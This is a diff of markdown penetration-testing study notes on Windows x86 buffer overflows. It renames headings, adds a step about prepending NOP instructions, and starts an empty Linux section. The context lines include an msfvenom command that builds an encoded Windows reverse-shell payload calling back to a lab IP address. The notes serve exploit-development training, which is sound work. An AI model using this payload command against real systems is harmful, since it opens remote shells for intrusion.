@@ -31,7 +31,7 @@ If you can't get low-level priv:
 * Think of what has been enumerated and how you can chain to get shell or sesnsitive info.
 * Read the exploit you're sending and see if it needs to be edited.
 
-## Windows x86 Buffer Overflow
+## Buffer Overflow - Windows x86
 
 Some BO guides:
 * https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/
@@ -79,7 +79,11 @@ __Generate and use shellcode__
    `$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
    In front of the shellcode are instructions to decode the encoded payload.
 2. We need to provide the shellcode docoder some stack-space to work with
-   * Append NOP instructions: 
+   * Append NOP instructions to the front of the payload e.g. `"\x90 * 16"`
+3. 
+
+
+## Buffer Overflow - Linux
 
 
 
